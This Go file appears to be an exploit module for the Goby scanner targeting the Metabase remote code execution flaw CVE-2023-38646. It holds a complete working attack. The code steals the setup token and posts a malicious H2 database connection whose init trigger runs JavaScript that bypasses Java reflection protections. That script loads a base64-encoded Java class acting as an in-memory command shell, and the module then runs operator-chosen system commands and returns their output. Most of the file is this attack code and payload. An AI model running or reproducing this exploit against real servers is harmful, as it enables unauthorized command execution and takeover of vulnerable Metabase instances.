package exploits

import (
	"encoding/json"
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Metabase JDBC Remote Code Execution Vulnerability (CVE-2023-38646)",
    "Description": "<p>Metabase is an open source data analysis and visualization tool that helps users easily connect to various data sources, including databases, cloud services, and APIs, and then use an intuitive interface for data query, analysis, and visualization.</p><p>A remote code execution vulnerability exists in Metabase that could allow an attacker to execute arbitrary code on a server running with Metabase server privileges.</p>",
    "Product": "Metabase",
    "Homepage": "https://www.metabase.com/",
    "DisclosureDate": "2023-07-21",
    "PostTime": "2023-07-27",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "title==\"Metabase\" || ((body=\"<script type=\\\"application/json\\\" id=\\\"_metabaseBootstrap\\\">\" || body=\"window.MetabaseLocalization = JSON.parse(document.getElementById(\\\"_metabaseLocalization\\\").textContent);\") && body=\"window.MetabaseRoot = actualRoot;\")",
    "GobyQuery": "title==\"Metabase\" || ((body=\"<script type=\\\"application/json\\\" id=\\\"_metabaseBootstrap\\\">\" || body=\"window.MetabaseLocalization = JSON.parse(document.getElementById(\\\"_metabaseLocalization\\\").textContent);\") && body=\"window.MetabaseRoot = actualRoot;\")",
    "Level": "3",
    "Impact": "<p>A remote code execution vulnerability exists in Metabase that could allow an attacker to execute arbitrary code on a server running with Metabase server privileges.</p>",
    "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.metabase.com/blog/security-advisory\">https://www.metabase.com/blog/security-advisory</a></p>",
    "References": [
        "https://www.metabase.com/blog/security-advisory"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/saml/login",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "SAMLRequest=PHNhbWxwOkF1dGhuUmVxdWVzdCB4bWxuczpzYW1scD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiB4bWxuczpzYW1sPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBJRD0icGZ4NDFkOGVmMjItZTYxMi04YzUwLTk5NjAtMWIxNmYxNTc0MWIzIiBWZXJzaW9uPSIyLjAiIFByb3ZpZGVyTmFtZT0iU1AgdGVzdCIgRGVzdGluYXRpb249Imh0dHA6Ly9pZHAuZXhhbXBsZS5jb20vU1NPU2VydmljZS5waHAiIFByb3RvY29sQmluZGluZz0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmJpbmRpbmdzOkhUVFAtUE9TVCIgQXNzZXJ0aW9uQ29uc3VtZXJTZXJ2aWNlVVJMPSJodHRwOi8vc3AuZXhhbXBsZS5jb20vZGVtbzEvaW5kZXgucGhwP2FjcyI+CiAgPHNhbWw6SXNzdWVyPkE8L3NhbWw6SXNzdWVyPgogIDxkczpTaWduYXR1cmUgeG1sbnM6ZHM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyMiPgogICAgPGRzOlNpZ25lZEluZm8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpDYW5vbmljYWxpemF0aW9uTWV0aG9kIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgIDxkczpTaWduYXR1cmVNZXRob2QgQWxnb3JpdGhtPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwLzA5L3htbGRzaWcjcnNhLXNoYTEiLz4KICAgICAgPGRzOlJlZmVyZW5jZSBVUkk9IiNwZng0MWQ4ZWYyMi1lNjEyLThjNTAtOTk2MC0xYjE2ZjE1NzQxYjMiPgogICAgICAgIDxkczpUcmFuc2Zvcm1zPgogICAgICAgICAgPGRzOlRyYW5zZm9ybSBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvMDkveG1sZHNpZyNlbnZlbG9wZWQtc2lnbmF0dXJlIi8+CiAgICAgICAgICA8ZHM6VHJhbnNmb3JtIEFsZ29yaXRobT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8xMC94bWwtZXhjLWMxNG4jIi8+CiAgICAgICAgPC9kczpUcmFuc2Zvcm1zPgogICAgICAgIDxkczpEaWdlc3RWYWx1ZT5BPC9kczpEaWdlc3RWYWx1ZT4KICAgICAgPC9kczpSZWZlcmVuY2U+CiAgICA8L2RzOlNpZ25lZEluZm8+CiAgICA8ZHM6U2lnbmF0dXJlVmFsdWU+QTwvZHM6U2lnbmF0dXJlVmFsdWU+CiAgPC9kczpTaWduYXR1cmU+CiAgPHNhbWxwOk5hbWVJRFBvbGljeSBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjEuMTpuYW1laWQtZm9ybWF0OmVtYWlsQWRkcmVzcyIgQWxsb3dDcmVhdGU9InRydWUiLz4KICA8c2FtbHA6UmVxdWVzdGVkQXV0aG5Db250ZXh0IENvbXBhcmlzb249ImV4YWN0Ij4KICAgIDxzYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPnVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDphYzpjbGFzc2VzOlBhc3N3b3JkUHJvdGVjdGVkVHJhbnNwb3J0PC9zYW1sOkF1dGhuQ29udGV4dENsYXNzUmVmPgogIDwvc2FtbHA6UmVxdWVzdGVkQXV0aG5Db250ZXh0Pgo8L3NhbWxwOkF1dGhuUmVxdWVzdD4="
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "SAML Assertion verification failed",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2023-38646"
    ],
    "CNNVD": [
        "CNNVD-202307-1845"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Metabase JDBC 远程代码执行漏洞（CVE-2023-38646）",
            "Product": "Metabase",
            "Description": "<p>Metabase是一个开源的数据分析和可视化工具，它可以帮助用户轻松地连接到各种数据源，包括数据库、云服务和API，然后使用直观的界面进行数据查询、分析和可视化。</p><p>Metabase 存在远程代码执行漏洞，可导致攻击者在服务器上以运行 Metabase 服务器的权限执行任意代码。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.metabase.com/blog/security-advisory\" target=\"_blank\">https://www.metabase.com/blog/security-advisory</a><br></p>",
            "Impact": "<p>Metabase 存在远程代码执行漏洞，可导致攻击者在服务器上以运行 Metabase 服务器的权限执行任意代码。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Metabase JDBC Remote Code Execution Vulnerability (CVE-2023-38646)",
            "Product": "Metabase",
            "Description": "<p>Metabase is an open source data analysis and visualization tool that helps users easily connect to various data sources, including databases, cloud services, and APIs, and then use an intuitive interface for data query, analysis, and visualization.</p><p>A remote code execution vulnerability exists in Metabase that could allow an attacker to execute arbitrary code on a server running with Metabase server privileges.</p>",
            "Recommendation": "<p>The manufacturer has released a bug fix, please pay attention to the update in time: <a href=\"https://www.metabase.com/blog/security-advisory\" target=\"_blank\">https://www.metabase.com/blog/security-advisory</a><br></p>",
            "Impact": "<p>A remote code execution vulnerability exists in Metabase that could allow an attacker to execute arbitrary code on a server running with Metabase server privileges.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10808"
}`
	sendPayloadFlagYx6n := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/api/session/properties")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		rsp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return nil, err
		}
		data := map[string]interface{}{}
		err = json.Unmarshal([]byte(rsp.Utf8Html), &data)
		if err != nil {
			return nil, errors.New("token 读取失败")
		}
		if data["setup-token"] == nil {
			return nil, errors.New("token 读取失败")
		}
		setupToken := data["setup-token"].(string)
		if setupToken == "" {
			return nil, errors.New("token 读取失败")
		}
		postRequestConfig := httpclient.NewPostRequestConfig("/api/setup/validate")
		postRequestConfig.VerifyTls = false
		postRequestConfig.FollowRedirect = false
		postRequestConfig.Header.Store("Content-Type", "application/json")
		postRequestConfig.Header.Store("cmd", cmd)
		// v0.44.5 ./metabase.db 本地运行 ../metabase.db Docker 版本
		// v0.46.6、v0.45.4 ./metabase.db ./plugins/sample-database.db 本地运行 ./plugins/sample-database.db Docker 版本
		filePaths := []string{"./metabase.db", "../metabase.db/metabase.db", "", "./plugins/sample-database.db"}
		defineClassBase64 := `yv66vgAAADIA8AoAGgBjCgBRAGQHAGUKAAMAZgoAWgBnCgBaAGgKABoAaQgAagoAGABrCgBZAGwKAFkAbQcAbggAbwgAcAcAcQgAcgoAGABzCAB0CgAZAHUIAHYKABgAdwoAeAB5CAB6BwB7BwB8BwB9CAB+BwB/CgAcAGMIAIAKABwAgQoAUQCCCgAcAIMIAIQIAIUHAIYKACQAhwoAJACICACJCACKCgAYAIsIAIwIAI0IAI4IAI8IAJAIAJEIAJIHAJMKABkAlAoAMQCVCgAxAIgIAJYKABkAlwgAmAoAmQCaCgAZAJsKABkAnAgAnQoAGQCeCACfCACgCAChCACiCACjCACkCAClCgCmAKcKAKYAqAcAqQoAXgCqCgBGAKsIAKwKAEYArQoARgCuCgBGAK8KAF4AsAoAXgCxCgADAIMIALIHALMBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQANU3RhY2tNYXBUYWJsZQEABmludm9rZQcAtAcAtQcAtgEACkV4Y2VwdGlvbnMBAARleGVjAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsHALcHALgHALkBAApTb3VyY2VGaWxlAQAISkUyLmphdmEMAFIAUwwAVwBTAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAugBTDAC7ALwMAL0AvgwAvwDAAQAHdGhyZWFkcwwAwQDCDADDAMQMAMUAxgEAE1tMamF2YS9sYW5nL1RocmVhZDsBAAx0aHJlYWRMb2NhbHMBAAV0YWJsZQEAE1tMamF2YS9sYW5nL09iamVjdDsBAAV2YWx1ZQwAxwDIAQATQXN5bmNIdHRwQ29ubmVjdGlvbgwAyQDKAQAKZ2V0UmVxdWVzdAwAywDMBwDNDABXAM4BAAlnZXRIZWFkZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nAQAQamF2YS9sYW5nL09iamVjdAEAA2NtZAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQABCgwAzwDQDABcAF0MANEAyAEADmdldFByaW50V3JpdGVyAQAFdXRmLTgBABNqYXZhL2lvL1ByaW50V3JpdGVyDADSANMMANQAUwEADkh0dHBDb25uZWN0aW9uAQAOZ2V0SHR0cENoYW5uZWwMANUAzAEAC2dldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAHQ2hhbm5lbAEAEHVuZGVybHlpbmdPdXRwdXQBAAhfY2hhbm5lbAEABnRoaXMkMAEAD2dldE91dHB1dFN0cmVhbQEAFGphdmEvaW8vT3V0cHV0U3RyZWFtDADWANcMANgA2QEAAAwA2gDbAQAHb3MubmFtZQcA3AwA3QBdDADeAMgMAN8AyAEAA3dpbgwA4ADhAQAEcGluZwEAAi1uAQAFIC1uIDQBAAIvYwEABSAtdCA0AQACc2gBAAItYwcA4gwA4wDkDABcAOUBABFqYXZhL3V0aWwvU2Nhbm5lcgwA5gDnDABSAOgBAAJcYQwA6QDqDADrAOwMAO0AyAwA7gDnDADvAFMBABBjb21tYW5kIG5vdCBudWxsAQADSkUyAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBABBqYXZhL2xhbmcvVGhyZWFkAQARamF2YS9sYW5nL1Byb2Nlc3MBABNbTGphdmEvbGFuZy9TdHJpbmc7AQATamF2YS9sYW5nL1Rocm93YWJsZQEAD3ByaW50U3RhY2tUcmFjZQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEADmdldFRocmVhZEdyb3VwAQAZKClMamF2YS9sYW5nL1RocmVhZEdyb3VwOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZW5kc1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBABFnZXREZWNsYXJlZE1ldGhvZAEACGdldEJ5dGVzAQAEKClbQgEABXdyaXRlAQAFKFtCKVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEABHRyaW0BAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kAIQBRABoAAAAAAAMAAQBSAFMAAQBUAAAAWwABAAIAAAARKrcAASq2AAKnAAhMK7YABLEAAQAEAAgACwADAAIAVQAAABoABgAAAA0ABAAPAAgAEgALABAADAARABAAEwBWAAAAEAAC/wALAAEHAFEAAQcAAwQAAQBXAFMAAgBUAAAFjQAGABsAAANDuAAFtgAGTCu2AAcSCLYACU0sBLYACiwrtgALwAAMTi06BBkEvjYFAzYGFQYVBaIDFBkEFQYyOgcZB7YABxINtgAJOggZCAS2AAoZCBkHtgALOgkZCccABqcC5BkJtgAHEg62AAk6ChkKBLYAChkKGQm2AAs6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`
		for _, filepath := range filePaths {
			postRequestConfig.Data = `{"token":"` + setupToken + `","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":null,"refingerprint":false,"auto_run_queries":true,"schedules":{},"details":{"db":"file:` + filepath + `",
"init": "DROP TRIGGER IF EXISTS shell3;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\ntry{load('nashorn:mozilla_compat.js')}catch(e){}function getUnsafe(){var theUnsafeMethod=java.lang.Class.forName('sun.misc.Unsafe').getDeclaredField('theUnsafe');theUnsafeMethod.setAccessible(true);return theUnsafeMethod.get(null)}function removeClassCache(clazz){var unsafe=getUnsafe();var clazzAnonymousClass=unsafe.defineAnonymousClass(clazz,java.lang.Class.forName('java.lang.Class').getResourceAsStream('Class.class').readAllBytes(),null);var reflectionDataField=clazzAnonymousClass.getDeclaredField('reflectionData');unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null)}function bypassReflectionFilter(){var reflectionClass;try{reflectionClass=java.lang.Class.forName('jdk.internal.reflect.Reflection')}catch(error){reflectionClass=java.lang.Class.forName('sun.reflect.Reflection')}var unsafe=getUnsafe();var classBuffer=reflectionClass.getResourceAsStream('Reflection.class').readAllBytes();var reflectionAnonymousClass=unsafe.defineAnonymousClass(reflectionClass,classBuffer,null);var fieldFilterMapField=reflectionAnonymousClass.getDeclaredField('fieldFilterMap');var methodFilterMapField=reflectionAnonymousClass.getDeclaredField('methodFilterMap');if(fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))){unsafe.putObject(reflectionClass,unsafe.staticFieldOffset(fieldFilterMapField),java.lang.Class.forName('java.util.HashMap').getConstructor().newInstance())}if(methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName('java.util.HashMap'))){unsafe.putObject(reflectionClass,unsafe.staticFieldOffset(methodFilterMapField),java.lang.Class.forName('java.util.HashMap').getConstructor().newInstance())}removeClassCache(java.lang.Class.forName('java.lang.Class'))}function setAccessible(accessibleObject){var unsafe=getUnsafe();var overrideField=java.lang.Class.forName('java.lang.reflect.AccessibleObject').getDeclaredField('override');var offset=unsafe.objectFieldOffset(overrideField);unsafe.putBoolean(accessibleObject,offset,true)}function defineClass(bytes){var clz=null;var version=java.lang.System.getProperty('java.version');var unsafe=getUnsafe();var classLoader=new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName('java.net.URL'),0));try{if(version.split('.')[0]>=11){bypassReflectionFilter();defineClassMethod=java.lang.Class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass',java.lang.Class.forName('[B'),java.lang.Integer.TYPE,java.lang.Integer.TYPE);setAccessible(defineClassMethod);clz=defineClassMethod.invoke(classLoader,bytes,0,bytes.length)}else{var protectionDomain=new java.security.ProtectionDomain(new java.security.CodeSource(null,java.lang.reflect.Array.newInstance(java.lang.Class.forName('java.security.cert.Certificate'),0)),null,classLoader,[]);clz=unsafe.defineClass(null,bytes,0,bytes.length,classLoader,protectionDomain)}}catch(error){error.printStackTrace()}finally{return clz}}function base64DecodeToByte(str){var bt;try{bt=java.lang.Class.forName('sun.misc.BASE64Decoder').newInstance().decodeBuffer(str)}catch(e){}if(bt==null){try{bt=java.lang.Class.forName('java.util.Base64').newInstance().getDecoder().decode(str)}catch(e){}}if(bt==null){try{bt=java.util.Base64.getDecoder().decode(str)}catch(e){}}if(bt==null){bt=java.lang.Class.forName('org.apache.commons.codec.binary.Base64').newInstance().decode(str)}return bt}var code='` + defineClassBase64 + `';defineClass(base64DecodeToByte(code)).newInstance()$$",
"advanced-options":false,"ssl":true},"name":"dad","engine":"h2"}}`
			rsp, err = httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				continue
			}
			// Instance already initialized 的情况是漏洞修复之后了
			if strings.Contains(rsp.Utf8Html, "Instance already initialized") {
				return nil, errors.New("漏洞利用失败")
			}
			if rsp.StatusCode == 200 {
				return rsp, nil
			}
			//  len(rsp.Utf8Html) < 10000 我payload 的长度
			if strings.Contains(rsp.Utf8Html, "Database cannot be found.") ||
				strings.Contains(rsp.Utf8Html, "connect to the database") ||
				(len(rsp.Utf8Html) < 10000 && strings.Contains(rsp.Utf8Html, "error")) {
				continue
			}
			return rsp, err
		}
		return nil, errors.New("漏洞利用失败")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, err := sendPayloadFlagYx6n(hostInfo, "echo "+checkStr)
			if err != nil {
				return false
			}
			return strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			// 默认为执行命令
			cmd := goutils.B2S(ss.Params["cmd"])
			if attackType != "cmd" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			rsp, err := sendPayloadFlagYx6n(expResult.HostInfo, cmd)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if rsp.StatusCode != 200 {
				expResult.Success = false
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output = rsp.Utf8Html
			return expResult
		},
	))
}
